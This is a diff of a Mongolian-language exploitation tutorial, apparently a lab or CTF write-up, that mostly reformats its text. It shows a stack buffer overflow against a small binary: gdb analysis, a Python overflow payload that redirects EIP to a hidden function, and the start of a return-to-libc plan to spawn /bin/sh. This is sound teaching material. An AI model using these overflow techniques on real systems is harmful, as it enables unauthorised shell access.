@@ -25,7 +25,7 @@ hello
 [+] zuv baildaa
 [root@reamb home]#
 ```
- notused.c дээр тухайн програмын бүрэн код хуулагдсан байна. Source код дээрээс харвал дээрх мөрүүд нь хамгийн сонирхолтой хэсгүүд юм.
+ `notused.c` дээр тухайн програмын бүрэн код хуулагдсан байна. Source код дээрээс харвал дээрх мөрүүд нь хамгийн сонирхолтой хэсгүүд юм.
 ```
 char * n0t_us3d = "/bin/bash";
 
@@ -35,7 +35,7 @@ int    call_me() {
 
 
 ``` 
-Энд хэзээ ч дуудагдахгүй n0t_us3d хувьсагчын утгыг system() дотор дуудаж чадвал бид shell ажиллуулж чадах юм. 
+Энд хэзээ ч дуудагдахгүй `n0t_us3d` хувьсагчын утгыг `system()` дотор дуудаж чадвал бид shell ажиллуулж чадах юм. 
 
 Юны түрүүнд binary файл дээр бүффер -ийн хэмжээг тооцолж үзье. үүнийг уламжиллалт аргаар ольё. 
 ```
@@ -44,11 +44,11 @@ int    call_me() {
 [+] zuv baildaa
 Segmentation fault
 ```
-128 байт аас эхлээд buffer дүүрч алдаа өгч байна. энийг souce code дээрээс  `char buf[128];` -ээр олж болно. Бид stack-г дүүргэн буцах Return address  дээр call_me хаяг байршуулж ажилуулах гэж үзье. 
+128 байт аас эхлээд buffer дүүрч алдаа өгч байна. энийг souce code дээрээс  `char buf[128];` -ээр олж болно. Бид stack-г дүүргэн буцах Return address(EIP)  дээр call_me хаяг байршуулж ажилуулах гэж үзье. 
 
->StackFrame нь  Stack(128 bytes) + ebp(4 bytes) + return adrress(4 bytes)  байдаг билээ. 
+>StackFrame нь  Stack(128 bytes) + EBP(4 bytes) + return adrress(EIP)(4 bytes)  байдаг билээ. 
 
-Үүнийг gdb дээр мөн шалгалт хийж тогтооё.
+Үүнийг `gdb` дээр мөн шалгалт хийж тогтооё.
 
 ```
 [root@reamb home]# python -c 'print "A"*128 + "BBBB"+"CCCC"+"DDDD"' > rea.txt
@@ -101,29 +101,29 @@ Stopped reason: SIGSEGV
 Missing separate debuginfos, use: debuginfo-install glibc-2.17-222.el7.i686
 ```
 
-Эндээс программ нь 0x43434343 буюу CCCC хаяг дээр кодыг ажилуулах гээд алдаа зааж байгаа нь харагдаж байна.  тэгвэл бид CCCC -н хаягыг call_me() ээр сольж бичиж үзье. call_me() ийн хаягыг эхэлж ольё.
+Эндээс программ нь `0x43434343` буюу `CCCC` хаяг дээр кодыг ажилуулах гээд алдаа зааж байгаа нь харагдаж байна.  тэгвэл бид `CCCC` -н хаягыг call_me() ээр сольж бичиж үзье. call_me() ийн хаягыг эхэлж ольё.
 
 ```
 [root@reamb home]# objdump -D ./notused |grep call_me
 080484dd <call_me>:
 ```
 
-фүнкцийн санах ой дээрх хаяг олдлоо. үүнийг stack руу бичих тул little indian буюу урвуугаар бичнэ.
+фүнкцийн санах ой дээрх хаяг олдлоо. үүнийг stack руу бичих тул `[little endian](https://chortle.ccsu.edu/AssemblyTutorial/Chapter-15/ass15_3.html)` буюу урвуугаар бичнэ.
 ``` 
 [root@rea home]# python -c 'print "A"*128 + "BBBB"+"\xdd\x84\x04\x08"' | ./notused
 [+] Feed me more!!!
 Mon Oct  8 17:13:01 +08 2018
 ```
 
-бидний хүссэн call_me -г дуудаж чадлаа. Одоо харин system(/bin/bash) хэрхэн дуудах вэ? 
+бидний хүссэн call_me -г дуудаж чадлаа. Одоо харин `system(/bin/bash)` хэрхэн дуудах вэ? 
 
 Үүнд бид `[Return-to-Libc](https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf)` аргыг ашиглах юм.  Үндсэн санаа нь memory дээр байрших фүнкц утгуудыг дахин дуудаж өөрт ашигтай хувьлбарт оруулан ашиглана. 
 
-Top of stack         |    EBP    | EIP                         | Dummy return addr |    address of /bin/sh string
+|Top of stack        |    EBP    | EIP                         | Dummy return addr |    address of /bin/sh string |
 
--------------------------------------------------------------------------------------------------------------------
-AAAAAAAAAAAAAA       |   BBBB    |   addr of system function   |     DUMM          |   address of /bin/sh string
-                     |           |                             |                   |                          
+|--------------------|-----------|-----------------------------|-------------------|------------------------------|
+|AAAAAAAAAAAAAA      |   BBBB    |   addr of system function   |     DUMM          |   address of /bin/sh string  |
+|                    |           |                             |                   |                              |
 
 Эндээс бидэнд   `system`  фүнкцийн хаяг болон `/bin/sh` string ийн хаягууд хэрэг болож байна.
 
